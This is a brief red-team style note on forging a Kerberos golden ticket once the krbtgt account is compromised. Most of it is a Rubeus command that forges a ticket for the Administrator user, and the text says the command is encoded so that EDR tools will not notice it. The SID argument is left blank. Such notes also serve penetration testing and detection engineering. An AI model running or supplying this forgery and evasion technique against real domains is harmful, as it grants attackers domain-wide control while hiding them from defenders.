# Golden ticket

When we compromise the account `krbtgt`, we can issue tickets for any service or user. We can in particular create a golden ticket.

First, we will encode the golden ticket in a way that will not trigger EDR. We specify only the beginning of the SID without the last identifier:

```powershell
> Rubeus.exe evasive-golden /aes256:<krbtgt's key> /ldap /sid: /user:Administrator /printcmd
```
